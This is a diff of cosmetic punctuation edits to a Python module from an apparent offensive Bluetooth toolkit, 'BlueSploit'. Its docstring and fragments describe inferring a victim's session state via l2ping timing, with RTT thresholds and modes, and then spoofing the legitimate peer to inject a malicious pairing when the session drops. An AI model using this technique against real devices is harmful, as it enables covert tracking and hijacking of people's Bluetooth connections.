@@ -3,25 +3,25 @@ BlueSploit Auxiliary: Stealtooth Session Monitor + Breaktooth Re-Pair Trigger
 
 Stealtooth (arxiv 2507.00847, 2025): uses l2ping echo request RTT timing and
 success/failure to remotely infer the state of a Bluetooth session between
-victim devices — connected, idle, or sleeping — WITHOUT pairing or any
+victim devices, connected, idle, or sleeping, WITHOUT pairing or any
 authenticated access to the target.
 
 Breaktooth: combines Stealtooth state monitoring with automatic re-pair
-injection — when a victim session drops (detected by l2ping state change),
+injection, when a victim session drops (detected by l2ping state change),
 the attacker immediately advertises as the legitimate peer to win the
 reconnection race and inject a malicious pairing.
 
 State inference signals:
   - l2ping RTT < 30ms        → device idle (radio active, fast response)
-  - l2ping RTT 30–200ms      → device in active session with another peer
+  - l2ping RTT 30-200ms      → device in active session with another peer
   - l2ping RTT > 200ms       → device in low-power / sniff mode
   - l2ping no response        → device disconnected / in deep sleep
   - RTT jitter > 50%          → contention with active session
 
 Modes:
-  monitor   — Passively probe target with l2ping, classify session state over time
-  trigger   — Wait for state transition (active→idle), launch re-pair injection
-  breaktooth — Full attack: monitor + auto-trigger spoofed advertising on drop
+  monitor  , Passively probe target with l2ping, classify session state over time
+  trigger  , Wait for state transition (active→idle), launch re-pair injection
+  breaktooth, Full attack: monitor + auto-trigger spoofed advertising on drop
 
 Reference:
   Stealtooth: Remote Session Monitoring of Bluetooth Devices via l2ping
@@ -91,7 +91,7 @@ def _classify_state(rtt_samples: List[Optional[float]]) -> str:
 
 class Module(AuxiliaryModule):
     """
-    Stealtooth + Breaktooth — l2ping-Based Session Monitor & Re-Pair Trigger
+    Stealtooth + Breaktooth, l2ping-Based Session Monitor & Re-Pair Trigger
 
     Remotely infers Bluetooth session state via l2ping RTT timing patterns,
     optionally triggers spoofed re-pair advertising the moment a session
@@ -175,7 +175,7 @@ class Module(AuxiliaryModule):
             print_error(f"Invalid target: {target}")
             return False
         if subprocess.run(["which", "l2ping"], capture_output=True).returncode != 0:
-            print_error("l2ping not found — install bluez-utils")
+            print_error("l2ping not found, install bluez-utils")
             return False
         mode = (self.get_option("mode") or "monitor").lower()
         if mode not in ("monitor", "trigger", "breaktooth"):
@@ -343,7 +343,7 @@ class Module(AuxiliaryModule):
         adapter     = self.get_option("interface") or "hci0"
         wait_state  = (self.get_option("trigger_state") or "disconnected").lower()
 
-        print_info(f"\n[Breaktooth] Full chain — monitor + auto re-pair")
+        print_info(f"\n[Breaktooth] Full chain, monitor + auto re-pair")
         print_info(f"  Watching {target} for state → {wait_state}")
         print_info(f"  On trigger: spoof {impersonate} on {adapter}")
         print_warning("Spoofed advertising fires immediately on session drop")
@@ -387,7 +387,7 @@ class Module(AuxiliaryModule):
                 fired["ts"] = ts
                 print_success(f"\n>>> Breaktooth trigger at {ts:.2f} <<<")
                 _start_spoof_advertising()
-                # Don't stop loop — keep monitoring to confirm reconnect
+                # Don't stop loop, keep monitoring to confirm reconnect
                 return False
             return False
 
